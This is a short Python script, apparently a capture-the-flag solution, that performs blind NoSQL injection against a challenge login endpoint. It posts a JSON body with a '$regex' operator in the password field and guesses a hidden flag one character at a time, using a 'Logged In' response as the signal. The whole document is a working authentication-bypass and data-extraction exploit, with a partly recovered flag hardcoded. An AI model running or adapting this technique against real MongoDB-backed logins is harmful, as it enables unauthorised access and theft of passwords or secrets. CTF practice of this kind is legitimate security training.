import requests
import json
import string

url="http://challs.ctf.cafe:9999/login"
konchan=string.ascii_uppercase+"_}{"+string.digits
b=""
for i in konchan:
    data={ "username":"admin", "password":{"$regex":"^RUSH{EZ_P3ASY_N0SQL_1NJ3CT1ON_232}"+i+".*"} }

    headers = {'Content-Type': 'application/json'}

    json_data = json.dumps(data)
    r=requests.post(url,data=json_data,headers=headers)
    if "Logged In" in r.text:
        print(i)
print(b)
